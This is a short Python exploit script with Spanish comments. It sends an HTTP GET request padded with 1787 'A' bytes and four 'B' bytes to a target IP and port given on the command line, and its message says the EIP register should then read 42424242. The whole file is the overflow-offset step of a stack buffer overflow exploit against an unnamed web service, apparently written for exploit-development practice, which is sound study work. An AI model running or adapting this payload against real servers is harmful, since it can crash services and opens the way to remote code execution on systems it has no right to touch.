import socket
import sys
try:
    host = sys.argv[1]
    puerto = sys.argv[2]
except:
    print ("[*]USO {} <Direccion IP> <Puerto> ").format(sys.argv[0])
    sys.exit()

try:
    buffer = "GET " + 1787 * 'A' + 'B' * 4 + " HTTP/1.1\r\n\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,int(puerto)))
    s.send(buffer)
    s.close()
    print("Si todo ha ido bien el EIP tiene que tener de valor 424242")
except:
    print("Algo ha ido mal... revisa")
    sys.exit()
